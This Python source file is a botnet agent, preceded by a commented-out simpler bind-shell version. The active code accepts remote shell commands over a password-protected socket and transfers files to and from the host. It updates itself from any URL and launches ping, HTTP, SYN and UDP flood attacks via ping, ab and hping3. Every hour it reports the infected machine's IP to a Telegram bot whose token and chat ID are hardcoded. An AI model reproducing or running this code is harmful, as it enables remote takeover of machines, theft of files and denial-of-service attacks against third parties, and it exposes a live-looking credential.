"""
import socket
import subprocess

def main():
    # Create a socket object to listen for commands from the controller
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 5556))  # Bind to any available interface and port 5556
    s.listen(1)  # Listen for incoming connections

    print("Bot listening for commands...")

    # Accept a connection from the controller
    conn, addr = s.accept()
    print(f"Connected to controller from {addr}")

    while True:
        # Receive the command from the controller
        command = conn.recv(1024).decode()
        print("Received command:", command)

        # Execute the command
        output = execute_command(command)

        # Send the output back to the controller
        conn.sendall(output.encode())

def execute_command(command):
    try:
        # Execute the command using subprocess
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        print("Command output:", result)
        return result
    except subprocess.CalledProcessError as e:
        error_message = "Error executing command: " + e.output
        print(error_message)
        return error_message

if __name__ == "__main__":
    main()

"""



#Om Namah Shivay ॐ नमः शिवाय 

import socket
import subprocess
import threading
import logging
import os
import requests
import asyncio
import psutil
from telegram import Bot
import time

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

SERVER_PORT = 5556
PASSWORD = "your_password"
BUFFER_SIZE = 4096
TELEGRAM_BOT_TOKEN = "7170187422:AAHe_qANT4SlYf3zTcsLfMpR2g5Yh-iFSh4"
CHAT_ID = "6213249872"

async def send_ip_to_telegram(ip_address):
    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    await bot.send_message(chat_id=CHAT_ID, text=f"Bot IP: {ip_address}")

def handle_client(conn):
    try:
        password = conn.recv(BUFFER_SIZE).decode()
        if password != PASSWORD:
            conn.send("AUTH_FAIL".encode())
            conn.close()
            return
        conn.send("AUTH_SUCCESS".encode())

        while True:
            command = conn.recv(BUFFER_SIZE).decode()
            if not command:
                break
            logging.info(f"Received command: {command}")

            if command == "upload":
                receive_file(conn)
            elif command == "system_info":
                output = get_system_info()
            elif command.startswith("list_files"):
                path = command.split(" ", 1)[1] if len(command.split(" ", 1)) > 1 else "."
                output = list_files(path)
            elif command.startswith("download"):
                file_path = command.split(" ", 1)[1]
                send_file(conn, file_path)
                continue
            elif command.startswith("update_bot"):
                url = command.split(" ", 1)[1]
                output = update_bot(url)
            elif command.startswith("ping -f"):
                target = command.split(" ")[2]
                output = execute_ddos_command(f"ping -f {target}")
            elif command.startswith("ab -n"):
                target = command.split(" ")[4]
                output = execute_ddos_command(f"ab -n 1000 -c 10 {target}")
            elif command.startswith("hping3 -S"):
                target = command.split(" ")[-1]
                output = execute_ddos_command(f"hping3 -S -c 1000 -d 120 -w 64 -p 80 --flood {target}")
            elif command.startswith("hping3 -2"):
                target = command.split(" ")[-1]
                output = execute_ddos_command(f"hping3 -2 -c 1000 -d 120 -p 53 --flood {target}")
            elif command in ["-h", "-help"]:
                output = available_commands()
            else:
                output = execute_command(command)

            conn.sendall(output.encode())
    except Exception as e:
        logging.error(f'Error handling client: {e}')
    finally:
        conn.close()

def receive_file(conn):
    try:
        file_name = conn.recv(BUFFER_SIZE).decode()
        file_size = int(conn.recv(BUFFER_SIZE).decode())
        with open(file_name, 'wb') as f:
            bytes_received = 0
            while bytes_received < file_size:
                data = conn.recv(BUFFER_SIZE)
                f.write(data)
                bytes_received += len(data)
        conn.send(f"File {file_name} uploaded successfully.".encode())
    except Exception as e:
        logging.error(f"Error receiving file: {e}")
        conn.send(f"Error receiving file: {e}".encode())

def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()
    except Exception as e:
        return str(e)

def execute_ddos_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return f"DDOS command executed: {command}"
    except subprocess.CalledProcessError as e:
        return f"Error executing DDOS command: {e.output.decode()}"
    except Exception as e:
        return f"Error: {str(e)}"

def get_system_info():
    try:
        cpu_usage = psutil.cpu_percent()
        memory_info = psutil.virtual_memory()
        disk_info = psutil.disk_usage('/')
        return (f"CPU Usage: {cpu_usage}%\n"
                f"Memory Usage: {memory_info.percent}% (Available: {memory_info.available / (1024 ** 3):.2f} GB)\n"
                f"Disk Usage: {disk_info.percent}% (Free: {disk_info.free / (1024 ** 3):.2f} GB)")
    except Exception as e:
        return str(e)

def list_files(path):
    try:
        files = os.listdir(path)
        return "\n".join(files)
    except Exception as e:
        return str(e)

def send_file(conn, file_path):
    try:
        if not os.path.exists(file_path):
            conn.send(f"Error: File {file_path} does not exist.".encode())
            return

        file_size = os.path.getsize(file_path)
        conn.send(file_path.encode())
        conn.recv(BUFFER_SIZE)  # Wait for ACK
        conn.send(str(file_size).encode())
        conn.recv(BUFFER_SIZE)  # Wait for ACK

        with open(file_path, 'rb') as f:
            bytes_sent = 0
            while bytes_sent < file_size:
                data = f.read(BUFFER_SIZE)
                conn.sendall(data)
                bytes_sent += len(data)

        conn.send(f"File {file_path} downloaded successfully.".encode())
    except Exception as e:
        logging.error(f"Error sending file: {e}")
        conn.send(f"Error sending file: {e}".encode())

def update_bot(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            with open(__file__, 'wb') as f:
                f.write(response.content)
            return "Bot updated successfully."
        else:
            return f"Failed to update bot. Status code: {response.status_code}"
    except Exception as e:
        return str(e)

def available_commands():
    return """Available commands:
- execute <command>: Execute a shell command on the bot
- upload: Upload a file to the bot
- system_info: Get system information (CPU, memory, disk usage)
- list_files <path>: List files in a specified directory
- download <file_path>: Download a file from the bot
- update_bot <url>: Update the bot from a specified URL
- ping -f <target IP>: Perform a Ping Flood DDOS attack
- ab -n 1000 -c 10 <target URL>: Perform an HTTP Flood DDOS attack
- hping3 -S -c 1000 -d 120 -w 64 -p 80 --flood <target IP>: Perform a SYN Flood DDOS attack
- hping3 -2 -c 1000 -d 120 -p 53 --flood <target IP>: Perform a UDP Flood DDOS attack
- help or -h: Display this list of available commands"""

def send_ip_periodically():
    while True:
        try:
            ip_address = requests.get('https://api.ipify.org').text
            asyncio.run(send_ip_to_telegram(ip_address))
            time.sleep(3600)  # Send IP every hour
        except requests.RequestException as e:
            logging.error(f"Error fetching IP address: {e}")
            time.sleep(60)  # Retry after 1 minute on network error

def start_server():
    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(("0.0.0.0", SERVER_PORT))
            server.listen(5)
            logging.info(f"Server listening on 0.0.0.0:{SERVER_PORT}")

            ip_address = requests.get('https://api.ipify.org').text
            asyncio.run(send_ip_to_telegram(ip_address))

            threading.Thread(target=send_ip_periodically, daemon=True).start()

            while True:
                client_socket, addr = server.accept()
                logging.info(f"Accepted connection from {addr}")
                client_handler = threading.Thread(target=handle_client, args=(client_socket,))
                client_handler.start()

        except Exception as e:
            logging.error(f"Server error: {e}")
            time.sleep(60)  # Retry after 1 minute on server error

if __name__ == "__main__":
    start_server()
